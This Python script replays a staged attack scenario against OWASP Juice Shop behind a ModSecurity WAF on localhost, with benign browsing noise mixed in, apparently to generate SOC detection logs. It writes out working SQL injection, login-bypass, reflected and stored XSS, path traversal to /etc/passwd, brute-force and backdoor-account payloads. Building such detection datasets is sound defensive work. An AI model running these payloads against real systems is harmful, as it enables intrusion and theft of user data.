"""
Hybrid Attack + Benign Noise Generation Script
Mirrors real SOC architecture with realistic timing.

Run: python generate_attack_scenario.py
"""

import subprocess
import time
import random
from datetime import datetime

WAF = "http://localhost:8080"
LOG_FILE = "scenario_run.log"

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {msg}\n")

def curl(url, method="GET", data=None, user_agent=None, silent=True):
    """Execute curl and return silently"""
    cmd = ["curl"]
    if silent:
        cmd.extend(["-s", "-o", "nul"])
    if method == "POST":
        cmd.extend(["-X", "POST"])
    if data:
        cmd.extend(["-H", "Content-Type: application/json", "-d", data])
    if user_agent:
        cmd.extend(["-A", user_agent])
    cmd.append(url)
    subprocess.run(cmd, shell=True, capture_output=True)

def delay(min_s=0.5, max_s=2.0):
    """Realistic human-like delay"""
    time.sleep(random.uniform(min_s, max_s))

def phase_header(name, number):
    log("=" * 60)
    log(f" PHASE {number}: {name}")
    log("=" * 60)

def noise_block(label, count=5):
    """Inject benign browsing between attacks"""
    log(f"  + Noise: {label} ({count} requests)")
    for _ in range(count):
        uri = random.choice([
            f"{WAF}/",
            f"{WAF}/rest/products",
            f"{WAF}/rest/products/search?q={random.choice(['apple','banana','orange','grape','mango','lime','peach'])}",
            f"{WAF}/rest/products/{random.randint(1,10)}/reviews",
            f"{WAF}/rest/products/search?q=green+juice",
            f"{WAF}/rest/products/search?q=fruit+salad",
            f"{WAF}/rest/products/search?q=healthy+drink",
        ])
        curl(uri, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120")
        delay(0.3, 1.5)

def false_positive_block():
    """Inject queries that look like attacks but are benign"""
    log("  + False positives (looks malicious, is benign)")
    fps = [
        (f"{WAF}/rest/products/search?q=select+all+fruit", "GET", None),           # "select" is benign
        (f"{WAF}/rest/products/search?q=drop+table+manners", "GET", None),          # "drop table" phrase
        (f"{WAF}/rest/products/search?q=javascript+for+beginners", "GET", None),    # "javascript" in query
        (f"{WAF}/rest/products/search?q=how+to+write+a+div+tag", "GET", None),      # HTML tags in benign context
        (f"{WAF}/rest/products/search?q=5%25+discount", "GET", None),               # %25 looks like encoding
        (f"{WAF}/rest/products/search?q=user's+manual", "GET", None),               # single quote in text
        (f"{WAF}/rest/products/search?q=admin+login+page", "GET", None),            # "admin login" not an attack
        (f"{WAF}/ftp/../legal.md", "GET", None),                                    # relative path, but legitimate
    ]
    for url, method, data in fps:
        curl(url, method, data)
        delay(0.3, 1.0)

def real_login(email, password, label="legitimate"):
    """Simulate a real user login"""
    data = f'{{"email":"{email}","password":"{password}"}}'
    curl(f"{WAF}/rest/user/login", method="POST", data=data)
    log(f"  + Login ({label}): {email}")

def failed_login(email, password, label="attack"):
    """Simulate a failed login attempt"""
    data = f'{{"email":"{email}","password":"{password}"}}'
    curl(f"{WAF}/rest/user/login", method="POST", data=data)
    log(f"  + Failed login ({label}): {email} / {password}")


# ===================================================================
# MAIN SCENARIO
# ===================================================================

log("")
log("╔══════════════════════════════════════════════════════════════╗")
log("║     HYBRID SOC ATTACK + NOISE SCENARIO                      ║")
log("║     Target: OWASP Juice Shop via ModSecurity WAF             ║")
log("╚══════════════════════════════════════════════════════════════╝")
log(f"  Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
log("")

# -------------------------------------------------------------------
# PHASE 1: RECONNAISSANCE (10:00 - 10:05)
# Attacker maps the target; normal users browse the store
# -------------------------------------------------------------------
phase_header("RECONNAISSANCE", 1)

# Normal users browse (pre-attack baseline)
log("  [Normal browsing - pre-attack baseline]")
noise_block("Morning shoppers", 8)

# Attacker starts recon
log("  [Attacker begins reconnaissance]")
delay(3, 8)  # Attacker waits before starting

for route in ["/", "/robots.txt", "/sitemap.xml", "/.env", "/admin", 
              "/console", "/swagger-ui.html", "/api-docs",
              "/rest/admin/application-version", "/ftp"]:
    curl(f"{WAF}{route}")
    delay(1, 3)
    log(f"  + Recon: GET {route}")

# Normals users continue browsing
false_positive_block()
noise_block("More browsing", 4)

# Attacker tests auth endpoints
log("  [Attacker probes auth endpoints]")
for route in ["/rest/user/whoami", "/rest/admin/application-configuration",
              "/rest/user/data-delight"]:
    curl(f"{WAF}{route}")
    delay(1, 2)
    log(f"  + Recon: GET {route}")

# ===================================================================
# PHASE 2: SQL INJECTION (10:06 - 10:10)
# Attacker tests SQLi vectors; legitimate admin logs in
# ===================================================================
delay(30, 60)  # Gap between phases (attacker analyzes recon results)
phase_header("SQL INJECTION", 2)

# Legitimate admin logs in (normal activity)
real_login("admin@juice-sh.op", "admin123", "legitimate admin")
delay(2, 4)

# False positive: normal user searches for "select" (benign)
curl(f"{WAF}/rest/products/search?q=select+all+fruit")
log("  + False positive: 'select all fruit' search")
delay(1, 2)

# Attacker starts SQLi probes
log("  [SQLi Phase 1: Basic probes]")
sqli_payloads = [
    ("GET", f"{WAF}/rest/products/search?q=lol'", "single quote probe"),
    ("GET", f"{WAF}/rest/products/search?q=lol'+OR+1=1--", "boolean-based"),
    ("GET", f"{WAF}/rest/products/search?q=lol'+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--", "union-based"),
    ("GET", f"{WAF}/rest/products/search?q=lol'+AND+1=CONVERT(int,'test')--", "error-based"),
    ("GET", f"{WAF}/rest/products/search?q=lol'+(SELECT+SLEEP(5))--", "time-based"),
    ("GET", f"{WAF}/rest/products/search?q=lol';+DROP+TABLE+users--", "stacked queries"),
]
for method, url, desc in sqli_payloads:
    curl(url, method)
    log(f"  + SQLi [{desc}]: {url.split('=')[-1][:40]}")
    delay(0.5, 2)

# Benign noise interspersed
noise_block("Normal shopping between SQLi", 3)

log("  [SQLi Phase 2: Login bypass attempts]")
for i, (email, pwd) in enumerate([
    ("' OR 1=1--", "x"),
    ("admin@juice-sh.op'--", "x"),
    ("' UNION SELECT 1--", "x"),
]):
    failed_login(email, pwd, f"sqli-login-{i+1}")
    delay(0.5, 1.5)

# More normal browsing
false_positive_block()
noise_block("Post-SQLi browsing", 3)

# ===================================================================
# PHASE 3: CROSS-SITE SCRIPTING (10:11 - 10:16)
# Attacker tests reflected + stored XSS with user activity
# ===================================================================
delay(30, 60)
phase_header("CROSS-SITE SCRIPTING (XSS)", 3)

# Benign user leaves a review (normal)
curl(f"{WAF}/api/Feedbacks", method="POST", 
     data='{"comment":"Best juice shop ever! Love the apple juice.","rating":5}')
log("  + Benign: User leaves 5-star review")

# False positive: user asks about HTML
curl(f"{WAF}/rest/products/search?q=how+to+write+a+div+tag+in+html")
log("  + False positive: 'how to write a div tag in html'")
delay(1, 2)

# Attacker starts XSS
log("  [XSS Phase 1: Reflected XSS]")
xss_reflected = [
    (f"{WAF}/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "script tag"),
    (f"{WAF}/rest/products/search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", "img onerror"),
    (f"{WAF}/rest/products/search?q=%3Csvg/onload%3Dalert(1)%3E", "svg onload"),
    (f"{WAF}/redirect?to=javascript:alert(document.cookie)", "javascript protocol"),
]
for url, desc in xss_reflected:
    curl(url)
    log(f"  + XSS Reflected [{desc}]")
    delay(0.5, 1.5)

# Benign noise
noise_block("Shopping between XSS attempts", 2)

log("  [XSS Phase 2: Stored XSS]")
curl(f"{WAF}/api/Feedbacks", method="POST",
     data='{"comment":"Great!<script>alert(1)</script>","rating":5}')
log("  + XSS Stored: feedback with script tag")

curl(f"{WAF}/api/Users", method="POST",
     data='{"email":"attacker@test.com","password":"Test1234!","username":"<img src=x onerror=alert(1)>"}')
log("  + XSS Stored: user registration with img tag")

curl(f"{WAF}/api/Feedbacks", method="POST",
     data='{"comment":"Nice shop <svg onload=alert(1)>","rating":4}')
log("  + XSS Stored: feedback with svg onload")

# Mixed attack: SQLi + XSS in same payload
curl(f"{WAF}/rest/products/search?q=%3Cscript%3E'+UNION+SELECT+1,2,3--%3C/script%3E")
log("  + Combined: SQLi + XSS in single payload")

# Benign noise + legitimate browsing
false_positive_block()
noise_block("Post-XSS browsing", 4)

# ===================================================================
# PHASE 4: BRUTE FORCE & CREDENTIAL STUFFING (10:17 - 10:22)
# Attacker tries brute force; real user types wrong password
# ===================================================================
delay(30, 60)
phase_header("BRUTE FORCE & CREDENTIAL STUFFING", 4)

# Real user: types password wrong once, then corrects (normal human behavior)
failed_login("user@shop.com", "almostright", "normal typo")
delay(3, 6)  # User takes a moment to retype
real_login("user@shop.com", "correctpassword", "corrected typo")
delay(2, 4)

# Attacker starts brute force
log("  [Brute Force: Admin account]")
brute_passwords = [
    "admin", "password", "123456", "admin123", "letmein",
    "qwerty", "test", "changeme", "juice", "root",
]
for i, pwd in enumerate(brute_passwords):
    failed_login("admin@juice-sh.op", pwd, f"brute-{i+1}")
    delay(0.3, 1.0)  # Rapid attempts (automated tool)

# Normal browsing continues during attack
noise_block("Concurrent browsing", 3)

# Credential stuffing against other users
log("  [Credential Stuffing: Multiple accounts]")
for user in ["user@example.com", "test@test.com", "ciso@juice-sh.op"]:
    failed_login(user, "password", f"stuff-{user}")
    delay(0.5, 1)

# Legitimate user logs in successfully (normal activity amidst attack)
real_login("admin@juice-sh.op", "admin123", "legitimate admin login during attack")
delay(2, 3)

# ===================================================================
# PHASE 5: PATH TRAVERSAL & DATA EXPOSURE (10:23 - 10:27)
# Attacker tries to read server files
# ===================================================================
delay(30, 60)
phase_header("PATH TRAVERSAL & DATA EXPOSURE", 5)

noise_block("Evening browsing", 2)

log("  [Path Traversal attacks]")
for route in [
    "/ftp/../../../etc/passwd",
    "/ftp/..\\..\\..\\windows\\win.ini",
    "/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/ftp/%252e%252e/%252e%252e/etc/passwd",
]:
    curl(f"{WAF}{route}")
    log(f"  + Path Traversal: {route}")
    delay(1, 2)

log("  [Hidden file access]")
curl(f"{WAF}/ftp/coupons_2013.md.bak")
curl(f"{WAF}/ftp/eastere.gg")
log("  + Hidden files accessed")

false_positive_block()

log("  [Admin API access without auth]")
curl(f"{WAF}/rest/admin/application-version")
curl(f"{WAF}/rest/admin/application-configuration")
log("  + Admin APIs accessed without authentication")

# ===================================================================
# PHASE 6: POST-EXPLOITATION (10:28 - 10:31)
# Attacker attempts to escalate / persist
# ===================================================================
delay(30, 60)
phase_header("POST-EXPLOITATION", 6)

noise_block("Final browsing session", 3)

log("  [Data dumping attempts]")
curl(f"{WAF}/rest/user/data-delight")
curl(f"{WAF}/rest/user/accounting")
log("  + Attempted to dump user data")

log("  [Backdoor creation]")
curl(f"{WAF}/api/Users", method="POST",
     data='{"email":"backdoor@evil.com","password":"Backd00r!","username":"backdoor"}')
log("  + Created backdoor account")

log("  [Source code / config access]")
for route in ["/.git/config", "/WEB-INF/web.xml", "/.htaccess"]:
    curl(f"{WAF}{route}")
    delay(0.5, 1)
log("  + Attempted to access config files")

# Final benign traffic
noise_block("End-of-day browsing", 4)

# ===================================================================
# SUMMARY
# ===================================================================
log("")
log("=" * 60)
log(" SCENARIO COMPLETE")
log(f" End: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
log("=" * 60)
log("")
log("Now collect your logs with these commands:")
log("")
log("  docker logs modsecurity > modsec_waf.log")
log("  docker logs juice-shop > juice_app.log")
log("  docker exec modsecurity cat /var/log/nginx/access.log > nginx_access.log")
log("  docker exec wazuh-manager cat /var/ossec/logs/alerts/alerts.json > wazuh_alerts.json")
log("")
log("Then run: python normalize_real_logs.py")
log("Then run: python llm_gen.py")
log("")
